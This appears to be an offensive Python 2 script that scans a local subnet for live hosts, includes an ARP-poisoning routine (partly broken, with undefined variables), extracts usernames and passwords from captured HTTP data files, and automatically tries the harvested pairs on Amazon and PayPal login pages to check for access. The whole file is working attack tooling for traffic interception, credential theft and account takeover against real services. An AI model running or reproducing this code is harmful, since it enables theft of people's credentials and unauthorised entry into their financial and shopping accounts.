import os, mechanize, re, socket, netifaces, getopt, sys

#from socket import *
from struct import *
from time import sleep

directory='./HTTPS/'
uLabel=['username=', 'user=']
pLabel=['password=', 'pass=']
endChar=['&','\n']

def createNetworkMap():
    
    #local host
    localHostAddressD=netifaces.ifaddresses('en0')
    localHostDLookup=localHostAddressD[netifaces.AF_INET]
    localHostAddress=localHostDLookup[0]['addr']
    
    #all hosts on network
    localHostAddressSplit=localHostAddress.split('.')
    basicSubnet=localHostAddressSplit[0]+'.'+localHostAddressSplit[1]+'.'+localHostAddressSplit[2]+'.'
    allHosts=[basicSubnet+`i` for i in range(1,255)]
    
    #gateway
    gatewayD=netifaces.gateways()
    gatewayDLookup=gatewayD[netifaces.AF_INET]
    gateway=gatewayDLookup[0][0]
    
    networkMap=[localHostAddress, allHosts, gateway]
    return networkMap
  

def getActiveHosts(nm):    
    activeHosts=[]
    for i in range(0,254):
        activeCheck=os.system('ping -c1 -t1 ' + nm[1][i])
        if(activeCheck==0):
            activeHosts.append(nm[1][i])
            
    return activeHosts    

def arpPoison():
    ETHER_BROADCAST="\xff"*6
    ETH_P_ETHER=0x0001
    ETH_P_IP=0x0800
    ETH_P_ARP=0x0806

    def usage():
        print "Usage: %s [-t target] [-i interface] [-s sleep] host"
        print "\t host : host to take over"
        print "\t target : MAC address of a specific target to ARP poison"
        print "\t sleep : time to sleep (in seconds) between two packets"
        sys.exit(1)




    def ether(src, dst, type):
        return dst+src+pack("!H",type)

    def arp(hw, p, hwlen, plen, op, hwsrc, psrc, hwdst, pdst):
        return pack("!HHBBH", hw, p, hwlen, plen, op) + hwsrc + psrc + hwdst + pdst

    def is_at(macsrc,ipsrc):
        return arp(ETH_P_ETHER, ETH_P_IP, 6, 4, 2, 
                   macsrc, inet_aton(ipsrc), ETHER_BROADCAST, pack("!I",INADDR_ANY))


    def mac2str(a):
        return reduce(str.__add__,map(lambda x: chr(int(x,16)), a.split(":")))

    def str2mac(a):
        return "%02x:%02x:%02x:%02x:%02x:%02x" % unpack("!6B",a)

    try:
        opts=("en0", activeHost, "2", localHostAddress) #my variables, replacing getopt

        target = mac2str(activeHostAddress)
        dev = "en0"
        slptime = 2
        for opt, parm in opts[0]:
            if opt == "-h":
                usage()
            elif opt == "-t":
                target = mac2str(parm) # XXX get mac from IP
            elif opt == "-i":
                dev = parm
            

        if len(opts[1]) == 0 :
            raise getopt.GetoptError("'host' parameter missing",None)
        elif len(opts[1]) > 1 :
            raise getopt.GetoptError("Too many parameters : [%s]" % string.join(opts[1]),None)
        else:
            host = opts[1][0]

        print "dev:", dev
        print "target:", str2mac(target) 
        print "host:", host
    except getopt.error, msg:
        print "ERROR:",msg
        usage()
    except KeyboardInterrupt:
        print "Interrupted by user"


    try:
        s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))
        s.bind((dev, ETH_P_ARP))
        mymac = s.getsockname()[4] 
        pkt = ether(mymac, target, ETH_P_ARP) + is_at(mymac, host)
        disp = "%s -> %s   %s is-at %s" % (str2mac(mymac), str2mac(target), host, str2mac(mymac))
        while 1:
            s.send(pkt)
        print disp
        sleep(slptime)
    except KeyboardInterrupt:
        pass

def createWorkList():
    global directory
    global uLabel
    global pLabel
    
    workList=[]
    
    for validFile in (os.listdir(directory)):
        currentScanFile=directory+validFile
        with open(currentScanFile, 'r') as fileContents:
            data=fileContents.read()
            i=0
            j=0
            uCheck=re.search(uLabel[i], data)
            pCheck=re.search(pLabel[j], data)
            if(uCheck and pCheck):
                workList.append(validFile)
            elif(uCheck and pCheck is None):
                j=j+1
                pCheck=re.search(pLabel[j], data)
                if(pCheck):
                    workList.append(validFile)
            elif(pCheck and uCheck is None):
                i=i+1
                uCheck=re.search(uLabel[i], data)
                if(uCheck):
                    workList.append(validFile)
    return workList

def createUsernameList(wl):
    global uLabel
    global endChar
    
    usernameList=[]
    
    i=0
    while(i<len(wl)):
        currentScanFile=directory+wl[i]
        with open(currentScanFile, 'r') as fileContents:
            data=fileContents.read()
            for j in range(2):
                k=0
                uStartCheck=re.search(uLabel[j], data)          
                if(uStartCheck):
                    uStart=data.index(uLabel[j])+len(uLabel[j])
                    uEndCheck=re.search(endChar[k], data)
                    if(uEndCheck):
                        uEnd=data.find(endChar[k], uStart)
                        username=data[uStart:uEnd]
                        usernameList.append(username)

                    else:
                        k=k+1
                        uEndCheck=re.search(endChar[k], data)
                        uEnd=data.find(endChar[k], uStart)
                        username=data[uStart:uEnd]
                        usernameList.append(username)                   
        i=i+1
    return usernameList

    
def createPasswordList(wl):
    global pLabel
    global endChar
    
    passwordList=[]
    
    i=0
    while(i<len(wl)):
        currentScanFile=directory+wl[i]
        with open(currentScanFile, 'r') as fileContents:
            data=fileContents.read()
            for j in range(2):
                k=0
                pStartCheck=re.search(pLabel[j], data)         
                if(pStartCheck):
                    pStart=data.index(pLabel[j])+len(pLabel[j])
                    pEnd=data.find(endChar[k],pStart,pStart+30)
                    if(pEnd is not -1):
                        password=data[pStart:pEnd]
                        passwordList.append(password)

                    else:
                        k=k+1
                        pEnd=data.find(endChar[k],pStart,pStart+30)
                        if(pEnd is not -1):
                            password=data[pStart:pEnd]
                            passwordList.append(password)                
        i=i+1
    return passwordList

def createCredentialPairList(ul,pl):
    credPairList=[]
    i=0
    while(i<len(ul)):
        credPairList.append([ul[i],pl[i]])
        i=i+1
    return credPairList

def amazon(cpl):
    i=0
    while(i<len(cpl)):
        br=mechanize.Browser()  
        br.set_handle_robots(False)  
        br.addheaders=[('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13')]  
   
        sign_in=br.open('https://www.amazon.com/gp/sign-in.html')  
        br.select_form(name='signIn')  
        br['email']=cpl[i][0] + '@gmail.com'
        br['password']=cpl[i][1]
        logged_in=br.submit() 
        br.open('https://www.amazon.com/gp/css/order-history/ref=nav_youraccount_orders')
        private_check=br.title()
        br.open('https://www.amazon.com/gp/flex/sign-out.html/ref=nav_youraccount_signout')
        sign_out_check=br.title()
        if(private_check!='Amazon.com Sign In'):
            print 'AMAZON'
        else:
            print 'TRY OTHER CREDENTIALS'
        i=i+1

def paypal(cpl):
    i=0
    while(i<len(cpl)):
        br=mechanize.Browser()  
        br.set_handle_robots(True)  
        br.addheaders=[('User-agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36')]  
        sign_in=br.open('https://www.paypal.com/signin/')  
        br.select_form(name='login')  
        br['login_email']=cpl[i][0] + '@gmail.com'
        br['login_password']=cpl[i][1]
        logged_in=br.submit() 
        br.open('https://www.paypal.com/myaccount/')
        print br.title()
        private_check=br.title()
        if(private_check=='https://www.paypal.com/myaccount/'):
            print 'PAYPAL'
        else:
            print 'TRY OTHER CREDENTIALS'
        br.open('https://www.paypal.com/myaccount/logout')
        sign_out_check=br.title()
        
        i=i+1
        
wl=createWorkList()
ul=createUsernameList(wl)
pl=createPasswordList(wl)
cpl=createCredentialPairList(ul,pl)
nm=createNetworkMap()
ah=getActiveHosts(nm)

